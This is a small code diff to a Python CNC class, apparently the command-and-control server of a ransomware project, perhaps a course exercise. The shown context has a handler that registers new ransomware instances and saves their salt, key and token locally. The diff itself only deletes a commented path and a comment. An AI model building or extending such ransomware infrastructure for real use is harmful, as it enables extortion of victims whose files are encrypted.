@@ -10,7 +10,7 @@ from cncbase import CNCBase
 
 class CNC(CNCBase):
     ROOT_PATH = "/root/CNC"
-    #RANSOMWARE_PATH = "/root/dist"
+    
 
     def save_b64(self, token:str, data:str, filename:str):
         # helper
@@ -23,7 +23,7 @@ class CNC(CNCBase):
 
     def post_new(self, path:str, params:dict, body:dict) -> dict:
         # used to register new ransomware instance
-        # local handling of function parameters/data
+        
         # The directory label is passed as a url parameter (hash of the token)
         label = params['label']
         # salt, key et token sont sauvegardé localement
